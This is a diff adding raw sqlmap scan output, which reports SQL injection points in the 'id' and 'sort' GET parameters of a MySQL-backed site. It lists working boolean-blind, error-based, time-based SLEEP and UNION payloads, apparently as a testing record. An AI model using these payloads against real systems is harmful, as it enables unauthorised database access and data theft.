@@ -1,0 +1,25 @@
+sqlmap identified the following injection point(s) with a total of 2375 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (7288=7288) THEN 1 ELSE (SELECT 7092 UNION SELECT 3884) END))&sort=avain
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(7403,6189)>(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(7403=7403,1))),0x716a6a7171,FLOOR(RAND(0)*2))x FROM (SELECT 1785 UNION SELECT 4081 UNION SELECT 6864 UNION SELECT 7157)a GROUP BY x)&sort=avain
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 8887 FROM (SELECT(SLEEP(5)))eGXn)&sort=avain
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7162626a71,0x65566b706a684258516f47494d6b56797569676b4b4470776775595667447a526546516d43664172,0x716a6a7171),NULL,NULL,NULL,NULL-- -&sort=avain
+
+Parameter: sort (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1&sort=avain AND (SELECT 6008 FROM (SELECT(SLEEP(5)))YRZE)
+---
+back-end DBMS: MySQL >= 5.0.12
